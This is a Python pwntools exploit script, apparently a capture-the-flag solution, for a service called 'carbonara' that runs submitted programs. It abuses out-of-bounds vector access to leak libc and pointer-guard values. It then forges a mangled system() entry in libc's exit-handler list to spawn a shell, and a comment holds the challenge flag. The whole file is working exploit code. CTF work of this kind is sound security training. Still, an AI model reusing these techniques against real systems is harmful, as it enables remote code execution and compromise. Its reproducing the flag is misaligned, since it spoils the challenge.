#!/usr/bin/env python3
from pwn import *


SIZE = 1000000
ELF_SIG = 0x464C457F
GNU_IDX = 0x1DC6A0 // 4
GNU_SIG = 0x20554E47
STDERR = 0x21A860
STDERR_PTR_IDX = 0x218EA8 // 4
SYSTEM = 0x50D60
INITIAL_IDX = 0x21AF00 // 4
COOKIE_TO_FIRST_ELF = 0x2890
SH = 0x1D869D


def connect():
    if args.LOCAL:
        tube = gdb.debug(["./docker/files/carbonara"], api=True)
        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.execute("set breakpoint pending on")
            tube.gdb.continue_nowait()
        return tube
    else:
        #return remote("localhost", 12011)
        return remote("carbonara-01.hfsc.tf", 12011)


def send_prog(tube, prog):
    tube.sendafter(
        b"Feed me your spaghetti code! (end with two newlines)\n", prog + "\n\n\n")


def main():
    i = SIZE
    di = 1
    first_elf = -1
    while True:
        with connect() as tube:
            send_prog(tube, f"""package Carbonara api;

fn Main() -> i32 {{
    var i: i32 = {i};
    var ptr: ()* = __intrinsic_vec_new({SIZE});
    while (true) {{
        Print("i={{0}}", i);
        var w: i32 = __intrinsic_vec_get(ptr, i);
        if (w == {ELF_SIG}) {{
            break;
        }}
        i = i + {di};
    }}
    var w: i32 = __intrinsic_vec_get(ptr, i + {GNU_IDX});
    if (not (w == {GNU_SIG})) {{ return 666; }}

    var stderr_lo: i32 = __intrinsic_vec_get(ptr, {i + STDERR_PTR_IDX});
    var stderr_hi: i32 = __intrinsic_vec_get(ptr, {i + STDERR_PTR_IDX + 1});
    var cookie_lo: i32 = __intrinsic_vec_get(ptr, {first_elf - COOKIE_TO_FIRST_ELF // 4});
    var cookie_hi: i32 = __intrinsic_vec_get(ptr, {first_elf - COOKIE_TO_FIRST_ELF // 4 + 1});
    var libc_lo: i32 = stderr_lo - {STDERR};
    if (not ((libc_lo & {0xfff}) == 0)) {{ return 444; }}
    var system_lo: i32 = libc_lo + {SYSTEM};
    var system_hi: i32 = stderr_hi;
    system_lo = system_lo ^ cookie_lo;
    system_hi = system_hi ^ cookie_hi;
    var a: i32 = system_lo << 17;
    var b: i32 = system_hi >> 15;
    b = b & 131071;
    var d: i32 = a | b;
    var e: i32 = system_hi << 17;
    var f: i32 = system_lo >> 15;
    f = f & 131071;
    var h: i32 = e | f;
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX}, 0); // next[lo]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 1}, 0); // next[hi]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 2}, 1); // idx[lo]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 3}, 0); // idx[hi]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 4}, 4); // flavor[lo]=ef_cxa
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 5}, 0); // flavor[hi]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 6}, d); // cxa.fn[lo]  
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 7}, h); // cxa.fn[hi]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 8}, stderr_lo - {STDERR} + {SH}); // cxa.arg[lo]
    __intrinsic_vec_set(ptr, {i + INITIAL_IDX + 9}, stderr_hi); // cxa.arg[hi]
    return 1337;
}}""")
            while True:
                s = tube.recvline()
                if s.startswith(b"i="):
                    i = int(s[2:])
                    continue
                if s.startswith(b"result: "):
                    result = int(s[8:])
                    if result == 666:
                        if first_elf == -1:
                            first_elf = i
                        di = 1024
                        i = i + di
                    elif result == 1337:
                        # midnight{~~YUMMY_you_PASTA_test~~!}
                        tube.interactive()
                        return
                    else:
                        raise Exception("unexpected result")
                    break
                if b"Segmentation fault" in s:
                    di = 1024
                    i = i + di
                    break


if __name__ == "__main__":
    main()
